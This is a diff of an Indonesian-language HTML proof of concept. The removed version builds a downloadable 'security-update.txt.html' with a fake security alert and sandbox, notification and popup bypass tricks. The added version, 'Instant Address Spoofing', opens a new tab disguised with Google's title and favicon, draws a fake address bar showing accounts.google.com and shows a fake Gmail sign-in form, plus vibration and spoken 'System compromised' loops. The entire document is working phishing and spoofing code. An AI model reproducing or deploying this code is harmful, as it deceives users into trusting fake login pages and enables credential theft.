@@ -3,149 +3,124 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Sandbox Bypass via Form + SW</title>
+<title>Instant Address Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
-.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
-:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
-:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
-h2 { margin-bottom: 10px; }
-p { margin-bottom: 15px; line-height: 1.5; }
-button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
+body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; text-align: center; border: 1px solid #333; }
+h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
+p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
+button { width: 100%; padding: 18px; cursor: pointer; border: none; border-radius: 8px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); transition: background 0.2s; }
 button:hover { background: #b71c1c; }
-#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
+button:disabled { background: #555; cursor: not-allowed; }
+#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Sandbox Bypass via Form</h2>
-<p>Memicu form submission dari dalam iframe sandbox untuk membuka tab baru & memunculkan modals.</p>
-
-<button id="start-btn" type="button">Mulai Generate File</button>
-<div id="status" role="status">Sistem siap.</div>
+    <h1>⚠️ INSTANT SPOOFING</h1>
+    <p>Memicu UI Spoofing instan tanpa delay port.</p>
+    
+    <button id="start-btn" type="button">Mulai Spoofing</button>
+    
+    <div id="status" role="status">Menunggu interaksi...</div>
 </div>
 
 <script>
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
 
-const prepareMimeBlobAsync = (i) => {
-    return new Promise((resolve) => {
-        queueMicrotask(() => {
-            const payloadText = "<!DOCTYPE html>" +
-            "<html>" +
-            "<head><meta charset='UTF-8'><title>SYSTEM ALERT</title></head>" +
-            "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
-            
-            "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
-            "    <h2 style='color:#ff4444;margin-bottom:10px;'>⚠️ Security Alert</h2>" +
-            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Kami mendeteksi aktivitas mencurigakan. Klik tombol di bawah untuk memverifikasi perangkat Anda.</p>" +
-            
-            // Iframe Tersembunyi
-            "    <iframe id='sandboxFrame' sandbox='allow-same-origin allow-scripts allow-forms' style='display:none;'></iframe>" +
-            
-            "    <button id='trigger-btn' style='background:#0078d4;color:#fff;border:none;padding:15px 30px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer;width:100%;'>Verifikasi Sekarang</button>" +
-            "    <p id='status' style='color:#ff9800;font-size:12px;margin-top:15px;'>Menunggu interaksi...</p>" +
-            "</div>" +
+let isProcessing = false;
 
-            "<script>" +
-            "(function(){" +
-            "\"use strict\";" +
+function efekHacker() {
+    if (navigator.vibrate) {
+        navigator.vibrate([1000, 200, 1000, 200, 1000]);
+    }
+    if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance('Hacked by Waguri');
+        utterance.lang = 'en-US';
+        utterance.rate = 0.9;
+        window.speechSynthesis.speak(utterance);
+    }
+}
 
-            // KONTEN IFRAME: Form + SW + Modals
-            "var iframeContent = `" +
-            "    <!DOCTYPE html>" +
-            "    <html>" +
-            "    <body style='background:transparent;'>" +
-            // FORM UNTUK BYPASS POPUP
-            "        <form id='f' action='https://example.com' method='GET' target='_blank' style='display:none;'></form>" +
-            "        <button id='show-notif-btn'>Trigger</button>" +
-            "        <script>" +
-            "            try {" +
-            "                navigator.serviceWorker.register('sw.js').then(function(reg) {" +
-            "                    console.log('SW Registered:', reg);" +
-            "                }).catch(function(err) { console.log('SW Error:', err); });" +
-            "            } catch(e) {}" +
-
-            "            document.getElementById('show-notif-btn').onclick = function() {" +
-            "                Notification.requestPermission(function(result) {" +
-            "                    if (result !== 'denied') {" +
-            "                        navigator.serviceWorker.ready.then(function(registration) {" +
-            "                            registration.showNotification('Security Update', {" +
-            "                                body: 'Klik untuk menyelesaikan verifikasi.'" +
-            "                            });" +
-
-            // Modals Bypass
-            "                            try {" +
-            "                                alert('Thanks. alert');" +
-            "                                console.log('Boom! console');" +
-            "                                confirm('what; confirm');" +
-            "                                prompt('oke; prompting');" +
-            "                            } catch(e) { console.log('Modals blocked:', e.message); }" +
-
-            // FORM SUBMISSION BYPASS
-            "                            try {" +
-            "                                document.getElementById('f').submit();" +
-            "                            } catch(e) { console.log('Form blocked:', e.message); }" +
-            "                        });" +
-            "                    }" +
-            "                });" +
-            "            };" +
-            "        <\/script>" +
-            "    </body>" +
-            "    </html>" +
-            "`;" +
-
-            "var frame = document.getElementById('sandboxFrame');" +
-            "frame.srcdoc = iframeContent;" +
-
-            "document.getElementById('trigger-btn').addEventListener('click', function() {" +
-            "    document.getElementById('status').textContent = 'Memproses bypass...';" +
-            "    try {" +
-            "        var frameDoc = frame.contentDocument || frame.contentWindow.document;" +
-            "        frameDoc.getElementById('show-notif-btn').click();" +
-            "    } catch(e) { console.log(e); }" +
-            "});" +
-
-            "})();" +
-            "<\/script>" +
-            "</body>" +
-            "</html>";
-          
-            const blob = new Blob([payloadText], { type: "text/html" });
-            const url = URL.createObjectURL(blob);
-            resolve({ id: i, url: url });
-        });
-    });
-};
-
-const triggerInstantDownload = (fileData) => {
-    const link = document.createElement("a");
-    link.href = fileData.url;
-    link.download = `security-update-${fileData.id}.txt.html`;
-    link.textContent = `Download security-update.txt.html`;
-    link.style.display = "none";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-};
-
-startBtn.addEventListener("click", () => {
+startBtn.addEventListener("click", function() {
+    if (isProcessing) return;
+    isProcessing = true;
     startBtn.disabled = true;
-    statusDiv.textContent = "Menyiapkan file...";
+    startBtn.textContent = "Memproses...";
 
-    setTimeout(async () => {
-        try {
-            const fileData = await prepareMimeBlobAsync(1);
-            triggerInstantDownload(fileData);
-            statusDiv.textContent = "File berhasil diunduh. Buka file .txt.html.";
-        } catch(e) {
-            statusDiv.textContent = "Gagal: " + e.message;
-        }
+    efekHacker();
+
+    statusDiv.textContent = "Memicu Instant Spoofing...";
+
+    // Buka tab kosong secara instan
+    const w = window.open('about:blank', '_blank');
+
+    if (!w) {
+        statusDiv.textContent = "Pop-up diblokir! Izinkan pop-up di browser Anda.";
+        isProcessing = false;
         startBtn.disabled = false;
-    }, 300);
+        return;
+    }
+
+    try {
+        // 1. TITLE BAR & FAVICON SPOOFING
+        w.document.title = "Google";
+        const link = w.document.createElement('link');
+        link.rel = 'icon';
+        link.href = 'https://www.google.com/favicon.ico';
+        w.document.head.appendChild(link);
+
+        // 2. HISTORY API (Mencoba ubah URL asli)
+        try { w.history.replaceState({}, '', 'https://accounts.google.com/signin'); } catch(e) {}
+
+        // 3. SUNTIKKAN UI PALSU + FAKE ADDRESS BAR (karena URL asli diblokir Chrome)
+        w.document.body.style.margin = "0";
+        w.document.body.style.padding = "0";
+        w.document.body.style.background = "#fff";
+        w.document.body.style.fontFamily = "Arial, sans-serif";
+        
+        w.document.body.innerHTML = `
+            <!-- FAKE ADDRESS BAR (Menempel di atas) -->
+            <div style="background:#e8eaed; padding:10px 15px; display:flex; align-items:center; border-bottom:1px solid #dadce0; position:fixed; top:0; left:0; width:100%; box-sizing:border-box; z-index:9999;">
+                <div style="background:#fff; border-radius:20px; padding:8px 15px; display:flex; align-items:center; width:100%; box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+                    <span style="color:#5f6368; margin-right:10px; font-size:16px;">🔒</span>
+                    <span style="color:#202124; font-size:14px; font-weight:bold;">https://accounts.google.com/signin</span>
+                </div>
+            </div>
+
+            <!-- KONTEN LOGIN PALSU -->
+            <div style="display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; background:#fff; padding-top:60px; box-sizing:border-box;">
+                <div style="width:100%; max-width:400px; padding:20px;">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:200px; margin-bottom:20px;">
+                    <h2 style="font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;">Sign in</h2>
+                    <p style="font-size:14px; color:#5f6368; margin-bottom:30px;">to continue to Gmail</p>
+                    <input type="email" placeholder="Email or phone" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
+                    <input type="password" placeholder="Password" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
+                    <button style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Next</button>
+                    <p style="color:#f00; font-size:10px; margin-top:20px;">Instant Spoof by Waguri</p>
+                </div>
+            </div>
+        `;
+
+        // 4. GETAR & TTS DI TAB BARU
+        w.eval(`
+            if (navigator.vibrate) { setInterval(function() { navigator.vibrate([500, 200, 500]); }, 2000); }
+            if ('speechSynthesis' in window) { setInterval(function() { var msg = new SpeechSynthesisUtterance('System compromised'); msg.lang = 'en-US'; window.speechSynthesis.speak(msg); }, 3000); }
+        `);
+
+        statusDiv.textContent = "Berhasil! UI Palsu telah disuntikkan secara instan.";
+        statusDiv.style.color = '#4CAF50';
+
+    } catch(e) {
+        statusDiv.textContent = "Gagal: Browser memblokir injeksi.";
+        statusDiv.style.color = '#f00';
+        isProcessing = false;
+        startBtn.disabled = false;
+    }
 });
 </script>
 </body>
